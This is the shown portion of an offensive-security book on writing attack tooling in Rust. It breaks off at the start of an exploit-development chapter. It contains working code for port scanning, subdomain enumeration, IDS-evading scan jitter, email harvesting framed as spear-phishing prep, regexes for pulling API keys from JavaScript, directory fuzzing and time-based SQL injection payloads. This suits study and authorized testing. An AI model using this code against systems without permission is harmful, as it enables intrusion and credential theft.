# Black Hat Rust
## Applied Offensive Security with the Rust Programming Language

---

> *"The best offense is a well-engineered offense."*

---

## Table of Contents

1. [Preface](#preface)
2. [Chapter 1 — Introduction: Why Rust for Offensive Security?](#chapter-1)
3. [Chapter 2 — Multi-threaded Attack Surface Discovery](#chapter-2)
4. [Chapter 3 — Going Full Speed with Async](#chapter-3)
5. [Chapter 4 — Adding Modules with Trait Objects](#chapter-4)
6. [Chapter 5 — Crawling the Web for OSINT](#chapter-5)
7. [Chapter 6 — Finding Vulnerabilities with Fuzzing](#chapter-6)
8. [Chapter 7 — Exploit Development in Rust](#chapter-7)
9. [Chapter 8 — Writing Shellcodes with no_std](#chapter-8)
10. [Chapter 9 — Phishing with WebAssembly](#chapter-9)
11. [Chapter 10 — Building a Modern RAT](#chapter-10)
12. [Chapter 11 — Securing C2 with End-to-End Encryption](#chapter-11)
13. [Chapter 12 — Cross-Platform Implants](#chapter-12)
14. [Chapter 13 — Turning a RAT into a Worm](#chapter-13)
15. [Chapter 14 — Conclusion](#chapter-14)

---

## Preface <a name="preface"></a>

This book exists because a gap exists. The security community has excellent Python resources, Go references, and C/C++ exploit guides — but almost nothing that treats Rust as a first-class language for offensive tooling. That gap is strategic, not accidental: the few practitioners already writing offensive Rust prefer to keep their edge.

Rust is uniquely suited to security tooling for several reasons that go beyond performance:

- **Memory safety without a garbage collector** — no accidental buffer overflows, use-after-free bugs, or dangling pointer issues in your own tooling
- **Zero-cost abstractions** — write high-level, readable code that compiles down to bare-metal performance
- **Powerful type system** — the compiler enforces correctness that Python and Go cannot
- **`no_std` support** — strip away the standard library entirely for shellcode and embedded implants
- **Cross-compilation** — target Windows, Linux, and macOS from a single codebase with minimal friction
- **Minimal runtime footprint** — Rust binaries are self-contained and small, critical for evasion

This book is not a tutorial. It is an engineering reference for building real offensive tools: scanners, crawlers, fuzzers, exploits, shellcode, phishing pages, Remote Access Tools, and worms. Each chapter builds toward a working tool, not a toy example.

**Prerequisites:** You should be comfortable with at least one systems language (C, C++, or Go). You do not need prior Rust experience — language concepts are introduced as they become necessary. You should understand basic networking (TCP/IP, HTTP, DNS) and have a working knowledge of how operating systems manage processes and memory.

**Ethics and Legal Notice:** All techniques in this book are published for authorized penetration testing, red team operations, CTF competitions, and security research. Never use these techniques against systems you do not own or have explicit written permission to test.

---

## Chapter 1 — Introduction: Why Rust for Offensive Security? <a name="chapter-1"></a>

### 1.1 The Landscape of Offensive Tooling

The offensive security ecosystem has historically been dominated by three languages:

**Python** — fast to write, massive library ecosystem, but slow, easily detected by AV/EDR, and GIL-limited for concurrency.

**C/C++** — maximum control, minimal footprint, but memory bugs in your own tooling can compromise your operation. A use-after-free in your implant is not a vulnerability you want.

**Go** — excellent concurrency, fast compilation, single binary output — but large binary size, runtime goroutine scheduler is a detection fingerprint, and the garbage collector can cause unpredictable latency.

Rust occupies a new position: **C-level control with compile-time safety guarantees.** The borrow checker eliminates entire classes of bugs at the source level. You get the binary footprint of C without the memory hazards.

### 1.2 Rust's Threat Model Alignment

Security tools have a unique threat model: *your own tooling can become a vector.* Consider:

- An exploit written in Python that parses attacker-controlled data could itself be exploited
- A C-based implant with an integer overflow could be weaponized by a defender to crash or hijack your RAT
- A memory leak in your scanner could cause it to terminate mid-operation

Rust eliminates these self-inflicted wounds. The borrow checker ensures:

- No double-free
- No use-after-free
- No data races in multi-threaded code
- No null pointer dereferences (unless you explicitly use `unsafe`)

### 1.3 Setting Up Your Environment

```bash
# Install Rust via rustup
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Add common cross-compilation targets
rustup target add x86_64-pc-windows-gnu
rustup target add x86_64-apple-darwin
rustup target add aarch64-unknown-linux-musl

# Install cross-compilation toolchain helper
cargo install cross
```

**Project structure used throughout this book:**

```
black-hat-rust/
├── ch02_scanner/
├── ch03_async_scanner/
├── ch04_modules/
├── ch05_crawler/
├── ch06_fuzzer/
├── ch07_exploit/
├── ch08_shellcode/
├── ch09_phishing/
├── ch10_rat/
├── ch11_encrypted_rat/
├── ch12_multiplatform/
└── ch13_worm/
```

### 1.4 Cargo Fundamentals for Security Tooling

Every tool in this book is a Cargo project. Understanding Cargo's power is essential:

```toml
# Cargo.toml — optimized for release builds
[profile.release]
opt-level = 3          # maximum optimization
lto = true             # link-time optimization — smaller binary, harder to RE
codegen-units = 1      # single codegen unit for better LTO
panic = "abort"        # removes panic unwinding code, smaller footprint
strip = true           # strip symbols from binary
```

The `strip = true` option removes debug symbols from your release binary — a simple but effective step toward reducing static analysis surface. Combined with `lto = true`, it produces a binary that is harder to reverse-engineer and has a smaller file signature.

### 1.5 Rust's Ownership Model — A Security Perspective

The borrow checker is not just an inconvenience for new Rust programmers — it is the language's core security primitive. Understanding it deeply will help you write safer tooling and exploit it when analyzing targets written in languages without it.

```rust
fn main() {
    // Ownership — each value has exactly one owner
    let data = vec![1u8, 2, 3, 4];

    // Move semantics — data is moved into process(), no copy
    process(data);

    // This would fail to compile: data was moved
    // println!("{:?}", data); // error[E0382]: use of moved value

    // Borrowing — lend without transferring ownership
    let payload = vec![0x90u8; 100];
    analyze(&payload);          // immutable borrow
    println!("len: {}", payload.len()); // still valid
}

fn process(buf: Vec<u8>) {
    println!("processing {} bytes", buf.len());
}

fn analyze(buf: &[u8]) {
    println!("first byte: 0x{:02x}", buf[0]);
}
```

This ownership model means that when you pass buffers around in your implant code, there is **no implicit copy** unless you explicitly call `.clone()`. This is critical for performance in high-throughput scanning and for ensuring sensitive data (keys, tokens) is not inadvertently left in memory.

---

## Chapter 2 — Multi-threaded Attack Surface Discovery <a name="chapter-2"></a>

### 2.1 Reconnaissance Theory

Reconnaissance is the systematic process of mapping an adversary's attack surface before any exploitation attempt. The broader and more accurate your map, the more entry points you discover. Reconnaissance is divided into two phases:

**Passive reconnaissance** — gathering information without directly contacting the target. This includes DNS lookups against public resolvers, certificate transparency log searches, WHOIS data, and web scraping. The target has no visibility into this activity.

**Active reconnaissance** — directly probing the target's infrastructure. Port scanning, banner grabbing, HTTP probing, and service fingerprinting. This generates logs and may trigger IDS/IPS alerts.

A port scanner is the foundational active reconnaissance tool. The goal is simple: given a target IP range and port list, determine which ports are open and what services are listening.

### 2.2 TCP Port Scanning Mechanics

A TCP port scan works at the transport layer. The three key techniques are:

**TCP Connect Scan** — completes a full three-way handshake (SYN → SYN-ACK → ACK), then immediately closes the connection. It is reliable but noisy — the connection is fully logged by the target OS.

**SYN Scan (Half-open)** — sends SYN, receives SYN-ACK (port open) or RST (port closed), then sends RST without completing the handshake. Faster and stealthier than Connect Scan but requires raw socket privileges.

**UDP Scan** — sends a UDP datagram; no response typically means open/filtered, ICMP Port Unreachable means closed. Slow and unreliable due to rate limiting.

For this chapter we implement a TCP Connect Scanner. It requires no special privileges and is the most portable approach.

### 2.3 Why Multi-threading?

A sequential scanner connects to one port at a time. Given a 10ms average timeout per port and 65,535 ports, a sequential scan takes over 10 minutes per host. With multi-threading, we can probe hundreds of ports simultaneously, collapsing this to seconds.

Rust's threading model is built on OS threads with guaranteed thread safety enforced at compile time. The `Send` and `Sync` traits determine what can safely cross thread boundaries — the compiler rejects code that could cause data races.

### 2.4 Building the Scanner

```toml
# Cargo.toml
[dependencies]
rayon = "1"          # data parallelism library
```

```rust
// src/main.rs
use std::net::{TcpStream, SocketAddr};
use std::time::Duration;
use std::sync::{Arc, Mutex};

fn scan_port(target: &str, port: u16, timeout_ms: u64) -> bool {
    let addr = format!("{}:{}", target, port);
    match addr.parse::<SocketAddr>() {
        Ok(socket_addr) => {
            TcpStream::connect_timeout(
                &socket_addr,
                Duration::from_millis(timeout_ms),
            ).is_ok()
        }
        Err(_) => false,
    }
}

fn main() {
    let target = "192.168.1.1";
    let timeout_ms = 200u64;
    let open_ports: Arc<Mutex<Vec<u16>>> = Arc::new(Mutex::new(Vec::new()));

    let ports: Vec<u16> = (1..=1024).collect();

    // Spawn a thread per port using rayon's parallel iterator
    use rayon::prelude::*;
    ports.par_iter().for_each(|&port| {
        if scan_port(target, port, timeout_ms) {
            let mut locked = open_ports.lock().unwrap();
            locked.push(port);
        }
    });

    let mut results = open_ports.lock().unwrap();
    results.sort();

    println!("Open ports on {}:", target);
    for port in results.iter() {
        println!("  {}/tcp  open", port);
    }
}
```

### 2.5 Thread Pool Architecture

The naive approach of spawning one thread per port (65,535 threads) would exhaust OS resources. A thread pool limits concurrency to a manageable number while keeping the queue of work saturated.

Rayon's `par_iter()` handles this automatically, using a work-stealing thread pool sized to the number of logical CPUs. For I/O-bound work (network connections), we can increase the pool size beyond CPU count:

```rust
use rayon::ThreadPoolBuilder;

fn main() {
    // Build a custom thread pool with 500 threads for I/O-bound work
    let pool = ThreadPoolBuilder::new()
        .num_threads(500)
        .build()
        .expect("failed to build thread pool");

    let target = "10.0.0.1";
    let ports: Vec<u16> = (1..=65535).collect();

    pool.install(|| {
        use rayon::prelude::*;
        let open: Vec<u16> = ports
            .par_iter()
            .filter(|&&port| scan_port(target, port, 200))
            .copied()
            .collect();

        println!("Open: {:?}", open);
    });
}
```

### 2.6 Banner Grabbing

Knowing a port is open tells you little. Banner grabbing reads the first bytes the service sends after connection — most services (SSH, FTP, SMTP, HTTP) announce themselves immediately.

```rust
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

fn grab_banner(target: &str, port: u16) -> Option<String> {
    let addr = format!("{}:{}", target, port);
    let mut stream = TcpStream::connect_timeout(
        &addr.parse().ok()?,
        Duration::from_millis(300),
    ).ok()?;

    stream.set_read_timeout(Some(Duration::from_millis(500))).ok()?;

    // Some services require a probe before responding (HTTP)
    if port == 80 || port == 8080 || port == 443 {
        let _ = stream.write_all(b"HEAD / HTTP/1.0\r\n\r\n");
    }

    let mut banner = [0u8; 1024];
    let n = stream.read(&mut banner).ok()?;

    String::from_utf8_lossy(&banner[..n])
        .trim()
        .lines()
        .next()
        .map(|s| s.to_string())
}
```

### 2.7 CIDR Range Expansion

Real-world scans target IP ranges, not individual hosts. CIDR notation (e.g., `192.168.1.0/24`) describes a block of addresses.

```rust
fn expand_cidr(cidr: &str) -> Vec<String> {
    // Parse "192.168.1.0/24"
    let parts: Vec<&str> = cidr.split('/').collect();
    let ip_str = parts[0];
    let prefix_len: u32 = parts[1].parse().expect("invalid prefix");

    let ip_bytes: Vec<u32> = ip_str
        .split('.')
        .map(|b| b.parse::<u32>().unwrap())
        .collect();

    let base_ip: u32 = (ip_bytes[0] << 24)
        | (ip_bytes[1] << 16)
        | (ip_bytes[2] << 8)
        | ip_bytes[3];

    let host_count = 1u32 << (32 - prefix_len);
    let network_mask = !0u32 << (32 - prefix_len);
    let network_addr = base_ip & network_mask;

    (1..host_count - 1)
        .map(|i| {
            let addr = network_addr + i;
            format!(
                "{}.{}.{}.{}",
                (addr >> 24) & 0xFF,
                (addr >> 16) & 0xFF,
                (addr >> 8) & 0xFF,
                addr & 0xFF
            )
        })
        .collect()
}
```

---

## Chapter 3 — Going Full Speed with Async <a name="chapter-3"></a>

### 3.1 The Limits of Multi-threading for I/O

The thread-pool scanner from Chapter 2 works well, but OS threads are expensive. Each thread consumes stack memory (typically 8MB by default on Linux) and requires kernel scheduler involvement for context switching. With 500 threads, you're consuming 4GB of virtual stack space.

The deeper problem is **blocking I/O**: while a thread waits for a TCP connection timeout, it holds an OS thread hostage doing nothing. The kernel must context-switch away, perform the wait, and context-switch back — each switch costs microseconds that compound across thousands of operations.

**Async I/O** solves this with cooperative multitasking. A single OS thread can manage thousands of concurrent I/O operations by yielding control when waiting, rather than blocking. The Rust async runtime (Tokio) implements an event loop that polls futures when their I/O is ready.

### 3.2 Rust's Async Model

Rust's async/await is **zero-cost** — it compiles down to state machines at compile time, not heap-allocated closures. This is fundamentally different from Go's goroutines (which have a runtime scheduler) or Python's asyncio (which uses a heap-allocated coroutine object).

Key concepts:

**Future** — a value that represents an asynchronous computation. A `Future` does nothing until it is polled. It returns `Poll::Pending` when waiting for I/O and `Poll::Ready(value)` when complete.

**async fn** — syntactic sugar that transforms a function into a state machine returning `impl Future`.

**await** — yields control back to the executor at an I/O boundary, allowing other futures to make progress.

**Executor (Tokio)** — the runtime that drives futures by polling them. Tokio uses a work-stealing thread pool under the hood, similar to Rayon, but optimized for async I/O via epoll/kqueue/IOCP.

```rust
// Synchronous — blocks the thread
fn connect_sync(addr: &str) -> bool {
    std::net::TcpStream::connect(addr).is_ok()
}

// Async — yields while waiting
async fn connect_async(addr: &str) -> bool {
    tokio::net::TcpStream::connect(addr).await.is_ok()
}
```

### 3.3 Rewriting the Scanner with Tokio

```toml
[dependencies]
tokio = { version = "1", features = ["full"] }
futures = "0.3"
```

```rust
use std::time::Duration;
use tokio::net::TcpStream;
use tokio::time::timeout;
use futures::stream::{self, StreamExt};

async fn scan_port(target: String, port: u16) -> Option<u16> {
    let addr = format!("{}:{}", target, port);
    match timeout(
        Duration::from_millis(200),
        TcpStream::connect(&addr),
    )
    .await
    {
        Ok(Ok(_)) => Some(port),
        _ => None,
    }
}

#[tokio::main]
async fn main() {
    let target = "192.168.1.1".to_string();
    let concurrency = 1000usize;

    let ports: Vec<u16> = (1..=65535).collect();

    // Process ports in batches of `concurrency`
    let mut open_ports: Vec<u16> = stream::iter(ports)
        .map(|port| scan_port(target.clone(), port))
        .buffer_unordered(concurrency) // run `concurrency` futures simultaneously
        .filter_map(|result| async move { result })
        .collect()
        .await;

    open_ports.sort();
    for port in &open_ports {
        println!("{}/tcp open", port);
    }
}
```

`buffer_unordered(concurrency)` is the key: it maintains up to `concurrency` in-flight futures simultaneously. When one completes, the next is immediately launched. This is fundamentally different from the thread-pool approach — all 1000 concurrent futures run in a handful of OS threads.

### 3.4 Performance Comparison

| Approach | Threads | Ports/sec | Memory |
|---|---|---|---|
| Sequential | 1 | ~5 | Minimal |
| Thread Pool (500) | 500 | ~2,500 | ~4GB virtual |
| Async Tokio (1000 concurrent) | 8 (CPU count) | ~10,000+ | ~50MB |

The async approach is both faster and lighter. On a 1Gbps network scanning a /16 (65,536 hosts × 1000 ports), the async scanner can complete reconnaissance an order of magnitude faster than the threaded approach.

### 3.5 Async DNS Resolution

Port scanning tells you what ports are open. DNS enumeration tells you what hostnames exist. Combining both gives you a complete picture.

```rust
use tokio::net::lookup_host;

async fn resolve_host(hostname: &str) -> Option<Vec<String>> {
    let addr = format!("{}:80", hostname);
    match lookup_host(&addr).await {
        Ok(addrs) => {
            let ips: Vec<String> = addrs
                .map(|a| a.ip().to_string())
                .collect();
            if ips.is_empty() { None } else { Some(ips) }
        }
        Err(_) => None,
    }
}

async fn subdomain_enum(domain: &str, wordlist: Vec<String>) {
    let concurrency = 200;

    stream::iter(wordlist)
        .map(|word| {
            let hostname = format!("{}.{}", word, domain);
            async move {
                if let Some(ips) = resolve_host(&hostname).await {
                    println!("{} -> {:?}", hostname, ips);
                }
            }
        })
        .buffer_unordered(concurrency)
        .collect::<Vec<_>>()
        .await;
}
```

### 3.6 Rate Limiting and Jitter

Aggressive scanning generates distinctive traffic patterns that IDS systems detect via thresholding. Two techniques reduce detection probability:

**Rate limiting** — cap the number of packets per second to stay below IDS thresholds.

**Jitter** — introduce random delays between probes to break the statistical signature of automated scanning.

```rust
use tokio::time::{sleep, Duration};
use rand::Rng;

async fn scan_with_jitter(target: &str, port: u16, max_jitter_ms: u64) -> bool {
    // Random delay between 0 and max_jitter_ms
    let jitter = rand::thread_rng().gen_range(0..max_jitter_ms);
    sleep(Duration::from_millis(jitter)).await;

    let addr = format!("{}:{}", target, port);
    timeout(
        Duration::from_millis(500),
        TcpStream::connect(&addr),
    )
    .await
    .map(|r| r.is_ok())
    .unwrap_or(false)
}
```

---

## Chapter 4 — Adding Modules with Trait Objects <a name="chapter-4"></a>

### 4.1 The Architecture Problem

As a scanner grows beyond port scanning — adding subdomain enumeration, HTTP probing, TLS certificate analysis, vulnerability checks — the codebase becomes monolithic. Every new capability requires modifying core scanner logic. This violates the Open/Closed Principle: a system should be open for extension but closed for modification.

The solution is a **plugin architecture**: define a common interface (trait) that all scanner modules implement, then write the core scanner to work against that interface. New modules can be added without touching existing code.

### 4.2 Rust Traits as Interfaces

A `trait` in Rust is similar to an interface in Java or Go, but more powerful. It defines a set of methods that a type must implement.

```rust
use std::collections::HashMap;

// The common interface all scanner modules implement
pub trait Module {
    // Human-readable name for the module
    fn name(&self) -> &str;

    // The actual scanning logic
    fn run(&self, target: &str) -> Result<Vec<Finding>, Box<dyn std::error::Error>>;
}

// A finding is a structured result from a module
#[derive(Debug)]
pub struct Finding {
    pub module: String,
    pub target: String,
    pub severity: Severity,
    pub description: String,
    pub data: HashMap<String, String>,
}

#[derive(Debug)]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}
```

### 4.3 Static vs. Dynamic Dispatch

Rust has two ways to work with traits:

**Static dispatch (generics)** — the compiler generates a separate copy of the function for each concrete type. Zero runtime overhead, but binary size grows with each type, and the set of types must be known at compile time.

```rust
fn run_module<M: Module>(module: M, target: &str) {
    let findings = module.run(target).unwrap();
    // ...
}
```

**Dynamic dispatch (trait objects)** — a pointer to the concrete type alongside a vtable (pointer to the methods). Small runtime overhead per call, but the concrete type can be determined at runtime. This is what enables plugin architectures.

```rust
fn run_module(module: &dyn Module, target: &str) {
    let findings = module.run(target).unwrap();
    // ...
}
```

For a scanner where modules are loaded from a configuration file or command line, dynamic dispatch is necessary — you don't know which modules will be active at compile time.

### 4.4 Building the Module Registry

```rust
use std::collections::HashMap;

pub struct Scanner {
    modules: Vec<Box<dyn Module>>,
}

impl Scanner {
    pub fn new() -> Self {
        Scanner { modules: Vec::new() }
    }

    pub fn register(&mut self, module: Box<dyn Module>) {
        self.modules.push(module);
    }

    pub fn run(&self, targets: &[String]) -> Vec<Finding> {
        let mut all_findings = Vec::new();

        for target in targets {
            for module in &self.modules {
                match module.run(target) {
                    Ok(mut findings) => all_findings.append(&mut findings),
                    Err(e) => eprintln!("[{}] error on {}: {}", module.name(), target, e),
                }
            }
        }

        all_findings
    }
}
```

### 4.5 Implementing Concrete Modules

```rust
// Module: HTTP probe
pub struct HttpProbe {
    client: reqwest::blocking::Client,
}

impl HttpProbe {
    pub fn new() -> Self {
        let client = reqwest::blocking::Client::builder()
            .timeout(Duration::from_secs(5))
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .unwrap();
        HttpProbe { client }
    }
}

impl Module for HttpProbe {
    fn name(&self) -> &str { "http_probe" }

    fn run(&self, target: &str) -> Result<Vec<Finding>, Box<dyn std::error::Error>> {
        let url = format!("http://{}", target);
        let resp = self.client.get(&url).send()?;

        let mut data = HashMap::new();
        data.insert("status_code".to_string(), resp.status().to_string());

        if let Some(server) = resp.headers().get("server") {
            data.insert("server".to_string(), server.to_str()?.to_string());
        }

        Ok(vec![Finding {
            module: self.name().to_string(),
            target: target.to_string(),
            severity: Severity::Info,
            description: "HTTP service detected".to_string(),
            data,
        }])
    }
}

// Module: TLS Certificate Inspector
pub struct TlsInspector;

impl Module for TlsInspector {
    fn name(&self) -> &str { "tls_inspector" }

    fn run(&self, target: &str) -> Result<Vec<Finding>, Box<dyn std::error::Error>> {
        // Connect to port 443, extract certificate fields
        // Subject, SAN, validity dates, issuer
        let addr = format!("{}:443", target);
        // ... TLS connection and certificate extraction
        Ok(vec![])
    }
}
```

### 4.6 Composing the Scanner

```rust
fn main() {
    let mut scanner = Scanner::new();

    // Register modules dynamically
    scanner.register(Box::new(PortScanner::new(vec![80, 443, 8080, 22, 21])));
    scanner.register(Box::new(HttpProbe::new()));
    scanner.register(Box::new(TlsInspector));
    scanner.register(Box::new(SubdomainEnumerator::new("wordlists/subdomains.txt")));

    let targets = vec!["example.com".to_string(), "target.org".to_string()];
    let findings = scanner.run(&targets);

    for f in findings {
        println!("[{:?}] {} - {}", f.severity, f.target, f.description);
    }
}
```

The power of this architecture: adding a new module (say, a WordPress vulnerability checker) requires writing one new struct implementing `Module`, then one line to register it. The scanner core is unchanged.

---

## Chapter 5 — Crawling the Web for OSINT <a name="chapter-5"></a>

### 5.1 OSINT Methodology

Open-Source Intelligence (OSINT) is the collection of information from publicly available sources. For an attacker, web crawling is one of the highest-value OSINT activities:

- **Email harvesting** — employee emails enable spear phishing and credential stuffing
- **Technology fingerprinting** — identifying CMS, frameworks, and libraries reveals vulnerability classes
- **File and directory discovery** — exposed configuration files, backup archives, and admin panels
- **Internal hostname/IP leakage** — error messages, comments, and headers often reveal internal infrastructure
- **API endpoint discovery** — JavaScript files routinely contain hardcoded API keys and internal endpoint URLs

### 5.2 How Web Crawlers Work

A web crawler is a graph traversal algorithm over the hyperlink graph of the web:

1. Start with a seed URL
2. Fetch the page
3. Parse all links from the HTML
4. Filter links to keep only those within scope (same domain, or explicitly allowed)
5. Add unseen links to the work queue
6. Repeat until the queue is empty or a depth/count limit is reached

The core data structure is a **visited set** (to avoid re-crawling) and a **work queue** (pending URLs). Concurrent crawling requires both to be thread-safe.

### 5.3 HTML Parsing in Rust

```toml
[dependencies]
reqwest = { version = "0.11", features = ["blocking"] }
scraper = "0.17"
url = "2"
```

```rust
use scraper::{Html, Selector};
use url::Url;

fn extract_links(html: &str, base_url: &Url) -> Vec<Url> {
    let document = Html::parse_document(html);
    let selector = Selector::parse("a[href]").unwrap();

    document
        .select(&selector)
        .filter_map(|el| el.value().attr("href"))
        .filter_map(|href| {
            // Resolve relative URLs against the base
            base_url.join(href).ok()
        })
        .filter(|url| {
            // Only HTTP/HTTPS links
            matches!(url.scheme(), "http" | "https")
        })
        .collect()
}

fn extract_emails(html: &str) -> Vec<String> {
    // Simple regex-based email extraction
    let re = regex::Regex::new(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}").unwrap();
    re.find_iter(html)
        .map(|m| m.as_str().to_string())
        .collect()
}
```

### 5.4 Async Concurrent Crawler

```rust
use std::collections::HashSet;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio::sync::Semaphore;

struct Crawler {
    client: reqwest::Client,
    visited: Arc<Mutex<HashSet<String>>>,
    semaphore: Arc<Semaphore>,
    max_depth: usize,
}

impl Crawler {
    pub fn new(concurrency: usize, max_depth: usize) -> Self {
        Crawler {
            client: reqwest::Client::builder()
                .timeout(Duration::from_secs(10))
                .user_agent("Mozilla/5.0 (compatible; Googlebot/2.1)")
                .build()
                .unwrap(),
            visited: Arc::new(Mutex::new(HashSet::new())),
            semaphore: Arc::new(Semaphore::new(concurrency)),
            max_depth,
        }
    }

    pub async fn crawl(&self, url: String, depth: usize) {
        if depth > self.max_depth {
            return;
        }

        // Mark as visited (check first to avoid duplicate work)
        {
            let mut visited = self.visited.lock().await;
            if visited.contains(&url) {
                return;
            }
            visited.insert(url.clone());
        }

        // Acquire semaphore slot (rate limiting)
        let _permit = self.semaphore.acquire().await.unwrap();

        let response = match self.client.get(&url).send().await {
            Ok(r) => r,
            Err(_) => return,
        };

        let base_url = match Url::parse(&url) {
            Ok(u) => u,
            Err(_) => return,
        };

        let body = match response.text().await {
            Ok(b) => b,
            Err(_) => return,
        };

        // Extract and print findings
        let emails = extract_emails(&body);
        for email in emails {
            println!("[EMAIL] {}", email);
        }

        // Recursively crawl child links
        let links = extract_links(&body, &base_url);
        let mut handles = Vec::new();

        for link in links {
            let link_str = link.to_string();
            // Stay in-scope: same host only
            if link.host_str() == base_url.host_str() {
                let crawler = self.clone(); // need Arc wrapping for this
                let handle = tokio::spawn(async move {
                    crawler.crawl(link_str, depth + 1).await;
                });
                handles.push(handle);
            }
        }

        for handle in handles {
            let _ = handle.await;
        }
    }
}
```

### 5.5 JavaScript Analysis for API Key Leakage

Modern web applications are largely JavaScript-driven. JS files are a goldmine for secrets: hardcoded API keys, internal URLs, and authentication tokens regularly appear in production JS bundles.

```rust
fn extract_secrets_from_js(js_content: &str) -> Vec<(String, String)> {
    let patterns = vec![
        ("AWS Key", r"AKIA[0-9A-Z]{16}"),
        ("AWS Secret", r"(?i)aws.{0,20}secret.{0,20}['\"][0-9a-zA-Z/+]{40}['\"]"),
        ("Google API Key", r"AIza[0-9A-Za-z\-_]{35}"),
        ("GitHub Token", r"ghp_[0-9a-zA-Z]{36}"),
        ("Generic API Key", r"(?i)api[_-]?key['\"]?\s*[:=]\s*['\"][0-9a-zA-Z]{20,}['\"]"),
        ("JWT Token", r"eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*"),
    ];

    let mut findings = Vec::new();
    for (name, pattern) in patterns {
        let re = regex::Regex::new(pattern).unwrap();
        for m in re.find_iter(js_content) {
            findings.push((name.to_string(), m.as_str().to_string()));
        }
    }
    findings
}
```

---

## Chapter 6 — Finding Vulnerabilities with Fuzzing <a name="chapter-6"></a>

### 6.1 Fuzzing Theory

Fuzzing is the automated process of feeding unexpected, malformed, or random inputs to a target system to provoke crashes, assertion failures, or unexpected behaviors that indicate exploitable vulnerabilities.

Modern fuzzing has evolved well beyond random input generation:

**Generation-based fuzzing** — create inputs from scratch based on a grammar or specification. Effective when the input format is known (e.g., HTTP requests, JSON payloads).

**Mutation-based fuzzing** — take valid inputs (corpus) and mutate them by flipping bits, inserting bytes, or combining multiple inputs. Less domain knowledge required.

**Coverage-guided fuzzing** — instrument the target binary to measure code coverage. Inputs that reach new code paths are retained in the corpus. This is how AFL, libFuzzer, and cargo-fuzz work.

**Black-box fuzzing** — fuzz without instrumentation or source access. Used for web applications, APIs, and closed-source binaries.

### 6.2 Web Application Fuzzing

Web fuzzing targets HTTP endpoints. The goal is to enumerate:

- Hidden directories and files (`/admin`, `/.env`, `/backup.zip`)
- Parameter values that trigger errors or information disclosure
- Injection points (SQL, command, template injection)
- Authentication bypasses

```toml
[dependencies]
tokio = { version = "1", features = ["full"] }
reqwest = { version = "0.11", features = ["json"] }
```

```rust
use tokio::sync::Semaphore;
use std::sync::Arc;

struct WebFuzzer {
    client: reqwest::Client,
    semaphore: Arc<Semaphore>,
}

impl WebFuzzer {
    pub fn new(concurrency: usize) -> Self {
        WebFuzzer {
            client: reqwest::Client::builder()
                .timeout(Duration::from_secs(5))
                .redirect(reqwest::redirect::Policy::none())
                .build()
                .unwrap(),
            semaphore: Arc::new(Semaphore::new(concurrency)),
        }
    }

    pub async fn fuzz_directories(&self, base_url: &str, wordlist: Vec<String>) {
        let tasks: Vec<_> = wordlist
            .into_iter()
            .map(|word| {
                let url = format!("{}/{}", base_url.trim_end_matches('/'), word);
                let client = self.client.clone();
                let sem = self.semaphore.clone();

                tokio::spawn(async move {
                    let _permit = sem.acquire().await.unwrap();
                    match client.get(&url).send().await {
                        Ok(resp) => {
                            let status = resp.status().as_u16();
                            // Ignore 404, show everything else
                            if status != 404 {
                                println!("[{}] {}", status, url);
                            }
                        }
                        Err(_) => {}
                    }
                })
            })
            .collect();

        for task in tasks {
            let _ = task.await;
        }
    }
}
```

### 6.3 SQL Injection Detection

SQL injection remains one of the most prevalent and impactful web vulnerabilities. Automated detection involves sending payloads that cause the database to behave differently and observing the difference in responses.

```rust
async fn detect_sqli(client: &reqwest::Client, url: &str, param: &str) -> bool {
    // Time-based blind SQLi — if the response takes significantly longer,
    // the injection caused a database sleep operation
    let payloads = vec![
        format!("{}' AND SLEEP(5)--", param),
        format!("{}' AND 1=SLEEP(5)--", param),
        format!("{}'; WAITFOR DELAY '0:0:5'--", param), // MSSQL
        format!("{}' OR SLEEP(5)--", param),
    ];

    let baseline_url = format!("{}?q={}", url, param);
    let baseline_start = std::time::Instant::now();
    let _ = client.get(&baseline_url).send().await;
    let baseline_ms = baseline_start.elapsed().as_millis();

    for payload in payloads {
        let test_url = format!("{}?q={}", url, urlencoding::encode(&payload));
        let start = std::time::Instant::now();
        let _ = client.get(&test_url).send().await;
        let elapsed = start.elapsed().as_millis();

        // If response took 4+ seconds more than baseline, likely vulnerable
        if elapsed > baseline_ms + 4000 {
            println!("[SQLI] Possible time-based injection: {}", test_url);
            return true;
        }
    }

    false
}
```

### 6.4 Coverage-Guided Fuzzing with cargo-fuzz

For fuzzing Rust libraries directly (parsing logic, deserialization, cryptographic implementations), `cargo-fuzz` integrates libFuzzer:

```bash
cargo install cargo-fuzz
cargo fuzz init
cargo fuzz add parser_fuzz
```

```rust
// fuzz/fuzz_targets/parser_fuzz.rs
#![no_main]
use libfuzzer_sys::fuzz_target;

fuzz_target!(|data: &[u8]| {
    // If this function panics or corrupts memory on any input,
    // the fuzzer will report the input that caused it
    if let Ok(s) = std::str::from_utf8(data) {
        let _ = my_parser::parse(s);
    }
});
```

```bash
# Run the fuzzer — it will generate and mutate inputs automatically
cargo fuzz run parser_fuzz
```

The fuzzer continuously generates new inputs, tracks code coverage, and retains inputs that reach new code paths. When it finds a crash, it saves the minimized input to `fuzz/artifacts/`.

---

## Chapter 7 — Exploit Development in Rust <a name="chapter-7"></a>

### 7.1 Why Rust for Exploit Development?

Python has historically dominated exploit development for its rapid iteration speed. Write a few lines, test, modify. The tradeoff is performance, portability, and the need for a Python interpreter on the target or attacker machine.

Rust occupies a different niche for exploit development:

- **Compiled exploits** — a Rust exploit is a self-contained binary. No interpreter dependency.
- **Type safety in exploit logic** — complex protocol parsing without accidental type confusion
- **Cross-compilation** — write once, compile for Windows/Linux/macOS/ARM
- **Network performance** — exploiting race conditions or timing-sensitive vulnerabilities benefits from Rust's predictable performance

### 7.2 Exploit Structure

A well-structured exploit has distinct phases:

```rust
pub struct Exploit {
    target: String,
    port: u16,
}

impl Exploit {
    pub fn new(target: &str, port: u16) -> Self {
        Exploit { target: target.to_string(), port }
    }

    // Phase 1: Verify the target is vulnerable before attempting exploitation
    pub async fn check(&self) -> Result<bool, Box<dyn std::error::Error>> {
        todo!("Implement vulnerability check")
    }

